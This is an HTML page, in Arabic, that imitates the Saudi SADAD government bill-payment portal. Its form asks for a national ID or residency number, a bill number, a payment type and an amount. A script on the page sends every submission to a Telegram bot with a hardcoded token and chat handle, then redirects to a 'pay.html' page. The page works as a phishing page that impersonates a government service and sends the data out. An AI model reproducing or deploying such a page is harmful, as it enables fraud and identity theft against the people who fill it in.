<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="index.css">
  <link rel="stylesheet" href="bootstrap.css" type="text/css" media="all" />
  <script src="bootstrap.js" type="text/javascript" charset="utf-8"></script>
  <title>السداد الحكومي</title>
</head>
<body>
<nav class="navbar navbar-expand-lg bg-light">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">
      <img src="sadad_logo.png" alt="sddad" width="60" height="30">
    </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent" dir="rtl">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="index.html">الرئيسيه</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="index.html">شخصي</a>
        </li>
        <li class="nav-item">
          <a class="nav-link " href="NewService.html">بدأ الخدمه</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="about-us.html">عن سداد </a>
        </li>
      </ul>
    </div>
  </div>
</nav>
<section class="main" dir="rtl">
  <form id="telegramForm" class="p-3">
   <div class="p-3 pt-2 pb-2 form-control mb-3 infodb">
     <h5>للسداد الحكومي</h5>
     <p class="p-1 pb-0">
       مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك، كفواتير الكهرباء، والمياه، والاتصالات، والرسوم الحكومية
     </p>
   </div>
   <div class="mb-3">
    <label for="inp1" class="form-label">ادخل رقم البطاقة/ الاقامة</label>
    <input name="inp1" type="text" class="form-control" id="inp1" placeholder="ادخل الرقم هنا " required>
   </div>
   <div class="mb-3">
    <label for="inp2" class="form-label">أدخل رقم السداد</label>
    <input name="inp2" type="text" class="form-control" id="inp2" placeholder="أدخل رقم السداد هنا" required>
   </div>
   <div class="mb-3">
    <label for="inp3" class="form-label">اختر نوع السداد</label>
    <select name="inp3" class="form-select" id="inp3" required>
      <option value="">اختر نوع السداد</option>
      <option value="مدفوعات حكومية">مدفوعات حكومية</option>
      <!-- باقي الخيارات كما هي -->
    </select>
   </div>
   <div class="mb-3">
    <label for="inp4" class="form-label">ادخل قيمة رسوم السداد </label>
    <input name="inp4" type="text" class="form-control" id="inp4" placeholder="ريال سعودي" required>
   </div>
   <button class="btn btn-primary btn-large" style="width:100%" type="submit" name="submit">دخول</button>
  </form>
</section>
<script>
  const botToken = '5158365562:AAEz1BsupVQMQTgOkEyfu8yi4cvjkmPLLv0';
  const chatId = '@Anas_mx';
  document.getElementById('telegramForm').addEventListener('submit', function (e) {
    e.preventDefault();

    // التحقق من القيم المدخلة
    const inp1 = document.getElementById('inp1').value.trim();
    const inp2 = document.getElementById('inp2').value.trim();
    const inp3 = document.getElementById('inp3').value;
    const inp4 = document.getElementById('inp4').value.trim();

    if (!inp1 || !inp2 || !inp3 || !inp4) {
      alert('يرجى ملء جميع الحقول المطلوبة.');
      return;
    }

    const uid = Date.now(); // رقم عملية فريد
    let message = `_______ هنالك طلب جديد _______\n\n`;
    message += `رقم العملية: ${uid}\n\n`;
    message += `رقم البطاقة / الاقامة: ${inp1}\n\n`;
    message += `رقم السداد: ${inp2}\n\n`;
    message += `نوع السداد: ${inp3}\n\n`;
    message += `رسوم السداد: ${inp4} ريال سعودي\n\n`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        window.location.href = `pay.html?id=${uid}`;
      } else {
        alert('حدث خطأ أثناء إرسال الطلب. الرجاء المحاولة لاحقاً.');
      }
    })
    .catch(error => {
      alert('تعذر الاتصال بالخادم. يرجى التحقق من اتصال الإنترنت.');
    });
  });
</script>
<footer class="footer p-2 text-center border-top text-center mt-4 infodb" dir="rtl">
  <div class="footer-copyright">
    <label id="CopyRight">جميع الحقوق محفوظة ® سداد حقوق الطبع والنشر 2023</label>
  </div>
</footer>
</body>
</html>